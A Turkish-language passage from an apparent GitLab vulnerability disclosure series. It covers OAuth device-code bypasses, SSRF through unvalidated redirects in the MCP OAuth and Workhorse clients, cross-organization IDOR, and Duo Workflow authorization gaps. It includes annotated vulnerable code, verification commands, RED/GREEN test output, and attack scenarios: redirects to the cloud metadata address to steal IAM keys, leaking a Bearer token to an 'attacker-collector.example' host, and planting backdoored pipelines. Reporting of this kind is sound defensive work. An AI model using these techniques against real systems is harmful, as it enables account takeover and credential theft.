3. **Adım 3 — `enforce_organization_maintenance_mode` ve `device_code` Organizasyon Çözümlemesi Eksikliği (`CAND-02C`, `tokens_controller.rb:42-70`):** Bir organizasyon `migration` (`503`) veya `legal` (`403`) bakım modunda kilitlendiğinde standart OAuth akışları durdurulurken, `TokensController#organization_for_token_request` içinde `urn:ietf:params:oauth:grant-type:device_code` dalı yer almadığı için cihaz jetonu basımı ve API üzerinden depo yazma (`POST /api/v4/projects/:id/repository/commits`) işlemleri kesintisiz devam eder.

```ruby
// File: app/controllers/oauth/device_authorizations_controller.rb (lines 4-35)
module Oauth
  class DeviceAuthorizationsController < Doorkeeper::DeviceAuthorizationGrant::DeviceAuthorizationsController
    include RequestPayloadLogger

    layout 'minimal'
    # BUG: Missing before_action :verify_confirmed_email!, :verify_admin_allowed!
    # BUG: Missing prepend_before_action :set_current_organization
    # BUG: Missing before_action :enforce_organization_maintenance_mode

// File: app/controllers/oauth/tokens_controller.rb (lines 42-52)
  def organization_for_token_request
    token_params = params.permit(:grant_type, :refresh_token, :code)
    case token_params[:grant_type]
    when 'refresh_token'
      OauthAccessToken.by_refresh_token(token_params[:refresh_token])&.organization
    when 'authorization_code'
      OauthAccessGrant.by_token(token_params[:code])&.organization
    # BUG: Missing when 'urn:ietf:params:oauth:grant-type:device_code'
    end
  end
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — `disable_admin_oauth_scopes=true` Açıkken Bile Sahte CLI/IDE Cihaz Koduyla Tüm GitLab Sunucusunun (Root/Admin) Ele Geçirilmesi:** GitLab'da yöneticileri korumak için `disable_admin_oauth_scopes=true` varsayılan olarak açıktır; yani sıradan bir kullanıcının oluşturduğu güvenilmeyen (`trusted: false`) bir OAuth uygulaması onaylansa bile asla `api` veya `admin_mode` yetkisi alamaz (`403 Forbidden`). Ancak `/oauth/device` bu kontrolü tamamen unuttuğu için, sıradan bir geliştirici veya dış yüklenici `scopes: "api admin_mode sudo"` ayarlı bir cihaz kodu (`user_code`) üretir. Bir sistem yöneticisi bu kodu onayladığı anda saldırgan **tam yetkili `admin_mode` + `api` erişim jetonu** elde eder; bu jetonla **şirketin tüm özel kaynak kodlarını indirir, tüm üretim CI/CD gizli anahtarlarını (`AWS_SECRET_ACCESS_KEY`, veritabanı şifreleri) çalar, kendine yeni Root hesabı açar ve tüm GitLab sunucusunu ele geçirir.**
* **Senaryo B — Doğrulanmamış / Başkasına Ait Kurumsal E-Posta (`confirmed_at: nil`) İle Kalıcı API Arka Kapısı (Persistence) Açılması:** Saldırgan kendisine ait olmayan veya hiç doğrulanmamış bir e-posta adresiyle (`confirmed_at: nil`) hesap açar. Standart `/oauth/authorize` ekranı bu hesabı `403 unconfirmed_email` ile engellerken, saldırgan `/oauth/device/authorize` üzerinden e-posta onayı yapmadan kalıcı `access_token` ve `refresh_token` üretir; web oturumu kapansa bile API üzerinden iç projelere erişmeye ve işlem yapmaya devam eder.
* **Senaryo C — Siber Olay İncelemesi (`legal` Hold) veya Veri Göçü (`migration`) Sırasında Dondurulmuş Üretim Depolarına Arka Kapı (Backdoor) Enjekte Edilmesi:** Şirket bir siber saldırı adli incelemesi (`legal` -> `403`) veya veri merkezi göçü (`migration` -> `503`) sırasında tüm organizasyonu bakım moduna alarak kod yazılmasını kilitler. Ancak `device_code` akışı bu kilidi atladığı için saldırgan dondurulmuş üretim deposuna `POST /api/v4/projects/1/repository/commits` (`201 Created`) ile **arka kapılı kod veya zararlı `.gitlab-ci.yml` pipeline'ı enjekte eder** ve adli delil bütünlüğünü bozar.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect missing before_action guards in DeviceAuthorizationsController vs AuthorizationsController
grep -n -C 6 "verify_admin_allowed!" \
  /home/community-user/targets/gitlab/app/controllers/oauth/authorizations_controller.rb \
  /home/community-user/targets/gitlab/app/controllers/oauth/device_authorizations_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report1_cand02
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "REPORT-01_CAND-02A-02B-02C": {
    "GREEN": {
      "device_authorize_status": 503,
      "maintenance_mode_write_succeeded": false,
      "post_token_admin_action_succeeded": false,
      "redacted_token_sample": null,
      "standard_oauth_blocked": true,
      "token_exchange_status": 503,
      "token_minted_admin_mode": false
    },
    "RED": {
      "device_authorize_status": 200,
      "maintenance_mode_write_succeeded": true,
      "post_token_admin_action_succeeded": true,
      "redacted_token_sample": "[REDACTED_TEST_TOKEN_SHA256:91ba3cabf8cbd392]",
      "standard_oauth_blocked": true,
      "token_exchange_status": 200,
      "token_minted_admin_mode": true
    },
    "patches": {
      "GITLAB-CAND-02-COMBINED.patch": "33f6cf48a91be9d564f3964e9b9c7a4c6d412b6814ebfa71356102767bddc698",
      "GITLAB-CAND-02C-MAINTENANCE-MODE.patch": "80bfc7b3ee0e328487e4de303a9d707e575989f848d778914b359494fac90aa8"
    }
  }
}
```


---

### III.13 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — AI Catalog MCP OAuth `CallbackService`, `RefreshTokenService`, `RevokeTokenService` ve `DynamicRegistrationClient` İçinde `307 Temporary Redirect` / Doğrulanmamış RFC 8414 Metadata SSRF ve Hata Gövdesi Yansıtması (`GITLAB-CAND-05`) (`CWE-918 / CWE-209`, CVSS `8.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/catalog/mcp_servers/callback_service.rb:17-50, 87-129`, `refresh_token_service.rb:18-70`, `dynamic_registration_client.rb:104-136`
* **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-209` — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/tr/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — RFC 8414 `token_endpoint`, `revocation_endpoint` ve `authorization_servers` Adreslerinin `UrlBlocker` İle Doğrulanmaması (`dynamic_registration_client.rb:104-136`):** `DynamicRegistrationClient`, yalnızca ilk keşif URL'sini kontrol eder; ancak dönen JSON içindeki `authorization_servers.first`, `token_endpoint` ve `revocation_endpoint` alanlarını `Gitlab::HTTP_V2::UrlBlocker.validate!` süzgecinden geçirmeden doğrudan döndürür.
2. **Adım 2 — `OAuth2::Client` (`oauth2 2.0.25`) Kullanımı Nedeniyle `307 Temporary Redirect` POST SSRF ve Kimlik Bilgisi Tekrarı (`callback_service.rb:38-50`, `refresh_token_service.rb:45-58`):** `CallbackService` ve `RefreshTokenService`, GitLab'ın güvenli `Gitlab::HTTP` istemcisi yerine ham `OAuth2::Client.new` (Faraday `net_http`, varsayılan `max_redirects: 5`) kullanır. Harici sunucu `307 Temporary Redirect` ile `http://127.0.0.1:...` veya `http://169.254.169.254/...` adresine yönlendirme yaptığında, `OAuth2::Client` içindeki `client_secret` ve `refresh_token` verileriyle birlikte `POST` isteğini dahili hedefe tekrarlar.
3. **Adım 3 — `OAuth2::Error#message` Üzerinden Dahili Hata Gövdesinin `flash[:alert]` İçine Yansıtılması (`callback_service.rb:24-25`):** Dahili servis `4xx`/`5xx` veya hatalı yanıt döndüğünde `OAuth2::Error` fırlatılır ve ham yanıt gövdesi `flash[:alert]` üzerinden doğrudan kullanıcı ekranına yansıtılır.

```ruby
// File: ee/app/services/ai/catalog/mcp_servers/callback_service.rb (lines 15-50)
        def execute
          token_params = { redirect_uri: redirect_uri }
          token_params[:code_verifier] = code_verifier if code_verifier

          access_token = build_oauth_client.auth_code.get_token(code, **token_params)
          store_token(access_token)
        rescue OAuth2::Error, StandardError => e
          # BUG 1: Reflects raw upstream HTTP error response body (e.message) into flash[:alert]
          error(format(_('Failed to connect to MCP server: %{error}'), error: e.message))
        end
        ...
        def build_oauth_client
          auth_server_url = registration_service.discover_auth_server_url
          metadata = registration_service.discover_metadata(auth_server_url)
          # BUG 2: Uses OAuth2::Client (Faraday net_http, max_redirects: 5) without UrlBlocker or IP pinning!
          OAuth2::Client.new(
            mcp_server.oauth_client_id,
            mcp_server.oauth_client_secret,
            site: auth_server_url,
            authorize_url: metadata['authorization_endpoint'],
            token_url: metadata['token_endpoint'],
            auth_scheme: ::Gitlab::Oauth::DynamicRegistrationClient.token_endpoint_auth_scheme(metadata)
          )
        end
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — AWS / GCP Bulut Sunucusu IAM Yetki Anahtarlarının (`169.254.169.254`) ve İç Yönetim Sırlarının Doğrudan Tarayıcı Ekranından (`flash[:alert]`) Çalınması:** Saldırgan, dışarıdaki kendi sunucusunu bir MCP sunucusu olarak kaydeder ve `token_endpoint` adresinden `307 Temporary Redirect` dönerek GitLab sunucusunu bulut metadata servisine (`http://169.254.169.254/latest/meta-data/iam/security-credentials/...`) veya iç ağdaki (`http://127.0.0.1:8080`, Vault, Consul, iç Kubernetes API) yönetim servislerine yönlendirir. `OAuth2::Client` yönlendirmeyi takip eder ve dönen iç yanıt gövdesini `OAuth2::Error#message` üzerinden doğrudan kullanıcının ekranındaki `flash[:alert]` kutusuna basar (`iam_role_credentials_exposed: true`). Böylece saldırgan **GitLab sunucusunun çalıştığı AWS/GCP bulut hesabının IAM anahtarlarını (`AccessKeyId`, `SecretAccessKey`) doğrudan ekrandan okuyup şirketin bulut altyapısını ele geçirir.**
* **Senaryo B — Güvenlik Duvarı Arkasındaki İç Servislere (`127.0.0.1` / Intranet) `POST` Komutu Gönderme ve `client_secret` / `refresh_token` Sızdırma:** `307 Temporary Redirect` HTTP metodunu (`POST`) ve gövdesini koruduğu için, `CallbackService` ve `RefreshTokenService` içindeki `OAuth2::Client` (`max_redirects: 5`), dışarıya kapalı iç mikroservislere (`127.0.0.1`) `POST` isteği göndererek **iç ağda işlem tetikler** ve aynı anda `client_secret` ile `refresh_token` sırlarını iç hedefe iletir (`canary_b_request_count = 5`).
* **Senaryo C — Bağlantı Kesme (`RevokeTokenService`) Üzerinden İç Ağ Tarama ve Basic Auth Kimlik Bilgisi Hırsızlığı:** Kullanıcı veya yönetici MCP bağlantısını keserken `RevokeTokenService`, `metadata['revocation_endpoint']` adresini doğrulamadan Basic Auth kimlik bilgileriyle `POST` göndererek iç ağ servislerinin taranmasına ve sırların çalınmasına yol açar.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect OAuth2::Client usage and OAuth2::Error reflection in CallbackService & RefreshTokenService
grep -n -C 12 "OAuth2::Client.new" \
  /home/community-user/targets/gitlab/ee/app/services/ai/catalog/mcp_servers/callback_service.rb \
  /home/community-user/targets/gitlab/ee/app/services/ai/catalog/mcp_servers/refresh_token_service.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.14 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — `Oauth::McpConnectorsAuthController`, `ConnectService` ve `Gitlab::Oauth::ClientState` İçinde Organizasyon İzolasyonu (`in_organization`), `update_ai_catalog_mcp_server` Yetkisi ve `state` Bağlaması Eksikliği (`GITLAB-CAND-06`) (`CWE-639 / CWE-862`, CVSS `8.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/controllers/oauth/mcp_connectors_auth_controller.rb:16-78`, `ee/app/services/ai/catalog/mcp_servers/connect_service.rb:16-79`, `ee/lib/gitlab/oauth/client_state.rb:17-23`
* **Zafiyet Sınıfı & Skor:** `CWE-639 / CWE-862` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/tr/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `.in_organization(Current.organization)` Olmadan Global `Ai::Catalog::McpServer.find` Çağrısı (`mcp_connectors_auth_controller.rb:19, 38, 63, 71-73`):** Denetleyici, yetki kontrolünü çağrıyı yapanın kendi organizasyonu (`Current.organization`) üzerinde yaptıktan sonra `::Ai::Catalog::McpServer.find(mcp_server_params[:id])` ile tüm veritabanında arama yapar. Böylece Organizasyon A'daki bir kullanıcı Organizasyon B'ye ait bir `McpServer` kaydına doğrudan erişebilir.
2. **Adım 2 — Yalnızca Okuma Yetkisiyle (`read_ai_catalog_mcp_server`) DCR İstemci Kimlik Bilgilerinin Üzerine Yazılması (`connect_service.rb:16-39`):** `ConnectService#execute`, `update_ai_catalog_mcp_server` yetkisini kontrol etmeden `register_oauth_client` çağırarak hedef `McpServer` kaydının `oauth_client_id` ve `oauth_client_secret` sütunlarını günceller.
3. **Adım 3 — `ClientState.from_state` İçinde `data` Bağlamasının Düşürülmesi (`client_state.rb:17-23`):** `ClientState.from_state` metodu `data:` parametresini iletmediği için HMAC doğrulaması `user_id` veya `organization_id` bağlamasını kontrol etmez.

```ruby
// File: ee/app/controllers/oauth/mcp_connectors_auth_controller.rb (lines 18-65)
    def connect
      mcp_server = ::Ai::Catalog::McpServer.find(mcp_server_params[:id]) # BUG 1: Missing .in_organization(Current.organization)
      result = ::Ai::Catalog::McpServers::ConnectService.new(
        mcp_server: mcp_server,
        redirect_uri: oauth_mcp_connectors_callback_url,
        return_to: mcp_server_params[:return_to] || root_path
      ).execute # BUG 2: Mutates oauth_client_id/secret without checking :update_ai_catalog_mcp_server!

// File: ee/lib/gitlab/oauth/client_state.rb (lines 19-23)
      def self.from_state(state)
        salt, token, return_to = state.to_s.split(':', 3)
        new(salt: salt, token: token, return_to: return_to) # BUG 3: Omits data: binding!
      end
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Başka Bir Şirketin / Organizasyonun (`Cross-Org`) Kurumsal Yapay Zeka (MCP) Konnektörünü Ele Geçirme:** Çok kiracılı (multi-organization) bir GitLab sisteminde Organizasyon A'daki saldırgan, `McpConnectorsAuthController` içinde `.in_organization(Current.organization)` kontrolü olmadığı için Organizasyon B'ye ait bir `McpServer` kimliğini hedef alır. `ConnectService` içinde yazma yetkisi (`update_ai_catalog_mcp_server`) kontrol edilmediğinden, saldırgan Dinamik İstemci Kaydı (DCR) başlatarak **kurban şirketin `oauth_client_id` ve `oauth_client_secret` kimlik bilgilerini kendi kontrolündeki OAuth bilgileriyle ezer (`cross_org_server_mutated: true`) ve kurban şirketin AI bağlantılarını ele geçirir.**
* **Senaryo B — Şirket İçinde Salt-Okunur (Guest/Reporter) Kullanıcının Üretim AI Konnektör Kimlik Bilgilerini Ezmesi:** Yalnızca okuma yetkisine (`read_ai_catalog_mcp_server`) sahip düşük yetkili bir kullanıcı, Maintainer yetkisi (`update_ai_catalog_mcp_server`) aranmadığı için şirketin MCP sunucusunun `oauth_client_id` / `oauth_client_secret` ayarlarını değiştirerek tüm ekibin AI entegrasyonunu kendi sahte istemcisine yönlendirir veya sabote eder.
* **Senaryo C — Bağsız `ClientState` Jetonuyla Kurban Geliştiricinin GitLab Hesabını Saldırganın AI Hesabına Bağlama (Login CSRF):** `ClientState.from_state` içinde kullanıcı ve organizasyon (`data`) doğrulaması düşürüldüğü için, saldırgan kendi ürettiği OAuth `state` bağlantısını kurban geliştiriciye tıklatarak kurbanın `McpServerUserConnection` kaydını saldırganın harici MCP hesabına bağlar; kurbanın AI asistanıyla yaptığı işlemler saldırganın hesabına akar.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect unscoped McpServer.find in McpConnectorsAuthController and ConnectService
grep -n -C 8 "McpServer.find" \
  /home/community-user/targets/gitlab/ee/app/controllers/oauth/mcp_connectors_auth_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.15 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — GitLab Workhorse DuoWorkflow Harici MCP İstemcisinde `transport.WithSSRFFilter()` Eksikliği ve Çapraz Kökenli Yönlendirmelerde `Authorization: Bearer` Token Sızıntısı (`GITLAB-CAND-01`) (`CWE-918 / CWE-522`, CVSS `8.2 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gitlab-org/gitlab` (`Go / GitLab Workhorse: gitlab.com/gitlab-org/gitlab/workhorse`)
* **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `workhorse/internal/ai_assist/duoworkflow/mcp.go:25-60, 101-112, 220-239`
* **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-522` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/tr/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `externalMcpTransport` Tanımında `transport.WithSSRFFilter` Argümanının Unutulması (`workhorse/internal/ai_assist/duoworkflow/mcp.go:41-44`):** Workhorse'un `transport.NewRestrictedTransport` fonksiyonu yalnızca açıkça `transport.WithSSRFFilter(...)` opsiyonu verildiğinde (`workhorse/internal/sendurl/sendurl.go:365-374` içinde yapıldığı gibi) özel IP, loopback (`127.0.0.1`) ve bulut metadata (`169.254.169.254`) adreslerini engeller. `mcp.go:41-44` bu parametreyi vermediği için harici MCP bağlantılarında hiçbir IP seviyesi SSRF filtresi çalışmaz.
2. **Adım 2 — `roundTripper.RoundTrip` İçinde Her Yönlendirme Adımında `Authorization: Bearer` Başlığının Yeniden Eklenmesi (`mcp.go:101-104, 231-234`):** Standart Go `http.Client`, farklı bir alan adına yapılan yönlendirmelerde `Authorization` başlığını `RoundTrip` çağrısından *önce* siler; ancak `duoworkflow.roundTripper.RoundTrip` kendi içinde `r.Header.Set(name, value)` çalıştırdığı ve `CheckRedirect` politikası tanımlamadığı için, `302 Found` yönlendirmesinde gizli `Authorization: Bearer` başlığını yeni hedefe doğrudan sızdırır.

```ruby
// File: workhorse/internal/ai_assist/duoworkflow/mcp.go (lines 41-44, 101-104, 231-234)
var externalMcpTransport = transport.NewRestrictedTransport(func(t *http.Transport) {
	t.MaxIdleConns = externalMcpMaxIdleConns
	t.MaxIdleConnsPerHost = externalMcpMaxIdleConnsPerHost
}) // BUG 1: Missing transport.WithSSRFFilter(false, nil)!

func (t *roundTripper) RoundTrip(r *http.Request) (*http.Response, error) {
	for name, value := range t.headers {
		r.Header.Set(name, value) // BUG 2: Re-injects Authorization header on cross-origin redirect hops!
	}
...
	t = &mcp.StreamableClientTransport{
		Endpoint:   endpoint,
		HTTPClient: &http.Client{Transport: rt}, // BUG 3: No CheckRedirect policy!
		DisableStandaloneSSE: true,
	}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Çapraz Kökenli (`Cross-Origin`) `302` Yönlendirmesiyle Kurban Geliştiricinin veya Yöneticinin Canlı `Authorization: Bearer` Erişim Jetonunun Çalınması (Tam Hesap ve Özel Depo Ele Geçirme):** Bir geliştirici veya yönetici Duo Workflow AI asistanını çalıştırdığında, GitLab Workhorse (`mcp.go`) harici MCP sunucusuna kullanıcının canlı `Authorization: Bearer <token>` başlığıyla bağlanır. Harici sunucu farklı bir alan adına (`https://attacker-collector.example/steal`) `302 Found` yönlendirmesi yaptığında, `roundTripper.RoundTrip` bu gizli başlığı silmeden yeni hedefe tekrar ekler (`bearer_token_leaked_to_canary: true`). **Saldırgan kurbanın canlı Bearer jetonunu doğrudan kendi sunucusunda yakalar ve bu jetonla kurbanın erişebildiği özel şirket depolarını indirir, gizli issue/MR kayıtlarını okur veya kurban adına işlem yapar.**
* **Senaryo B — Workhorse Süreci Üzerinden İç Ağa (`127.0.0.1`), İç Mikroservislere ve Bulut Metadata (`169.254.169.254`) Servisine Doğrudan SSRF:** `externalMcpTransport` içinde `transport.WithSSRFFilter()` unutulduğu için, ilk kayıtta geçerli bir genel adrese sahip olan MCP uç noktası `302` ile `http://127.0.0.1:...` veya `http://169.254.169.254/...` adresine yönlendirme yaptığında Workhorse doğrudan iç servise bağlanır.
* **Senaryo C — DNS Rebinding İle Güvenlik Duvarı Arkasındaki İç Şirket Ağına Sızma:** Kayıt sırasında genel IP döndüren alan adı, Workhorse bağlantı kurarken `127.0.0.1` veya `10.0.0.1` döndürdüğünde soket seviyesinde `WithSSRFFilter` olmadığı için iç şirket ağına doğrudan erişilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Compare externalMcpTransport in duoworkflow/mcp.go against sendurl/sendurl.go
grep -n -C 8 "NewRestrictedTransport" \
  /home/community-user/targets/gitlab/workhorse/internal/ai_assist/duoworkflow/mcp.go \
  /home/community-user/targets/gitlab/workhorse/internal/sendurl/sendurl.go

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.16 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — Duo Workflow `/ws` ve `McpConfigService#item_version` Üzerinde `:read_ai_catalog_item` Yetki Kontrolü Eksikliği ve `workflow_definition` Parametresiyle Özel Ajan Yazma Araçlarının Enjeksiyonu (`GITLAB-CAND-08`) (`CWE-862 / CWE-639`, CVSS `7.7 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:131-135`, `ee/lib/api/ai/duo_workflows/workflows.rb:341-344, 1065`, `connection_config_service.rb:220-228`
* **Zafiyet Sınıfı & Skor:** `CWE-862 / CWE-639` — **CVSS v3.1: `7.7 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/tr/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Aynı Dosya İçindeki (`mcp_config_service.rb:134` vs `334`) Açık Yetki Çelişkisi:** `ee/app/services/ai/duo_workflows/mcp_config_service.rb` dosyasının 334. satırındaki `ai_catalog_mcp_servers` metodu `return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version)` kontrolünü yaparken, aynı dosyanın 134. satırındaki `item_version` metodu hiçbir yetki kontrolü yapmadan `::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id)` döndürür.
2. **Adım 2 — `GET /api/v4/ai/duo_workflows/ws` (`workflows.rb:1065`) Üzerinde Satır 1426 Güvenlik Kuralının Atlanması:** `workflows.rb:1426` satırındaki geliştirici yorumu `workflow_definition` değerinin kullanıcı parametresinden değiştirilmemesi gerektiğini açıkça belirtmesine rağmen, `get :ws` (`workflows.rb:1065`) ve `ConnectionConfigService#mcp_config_service` (`connection_config_service.rb:220-228`) doğrudan kullanıcının gönderdiği `workflow_definition` ve `ai_catalog_item_version_id` parametrelerini kullanır.
3. **Adım 3 — Yabancı Özel (`public: false`) Ajanın Yazma Araçlarının Oturuma Enjekte Edilmesi:** Saldırgan başka bir özel projedeki ajanın `ai_catalog_item_version_id` kimliğini vererek, normalde kapalı olan yazma araçlarını (`create_issue` vb.) Duo Workflow MCP yapılandırmasına enjekte eder.

```ruby
// File: ee/app/services/ai/duo_workflows/mcp_config_service.rb (lines 131-135 vs 330-335)
      def item_version
        return unless ai_catalog_item_version_id.present?

        ::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id) # BUG 1: Missing Ability.allowed?(current_user, :read_ai_catalog_item, version)!
      end
      ...
      def ai_catalog_mcp_servers
        return {} unless item_version
        return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version) # Enforced here at line 334, but omitted at line 134!

// File: ee/app/services/ai/duo_workflows/connection_config_service.rb (lines 222-228)
      def mcp_config_service
        ::Ai::DuoWorkflows::McpConfigService.new(
          current_user,
          gitlab_token,
          workflow_definition: request_metadata.workflow_definition, # BUG 2: Uses unvalidated request_metadata instead of workflow record!
          ai_catalog_item_version_id: request_metadata.ai_catalog_item_version_id,
          namespace: project&.project_namespace || enforcement_namespace
        )
      end
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
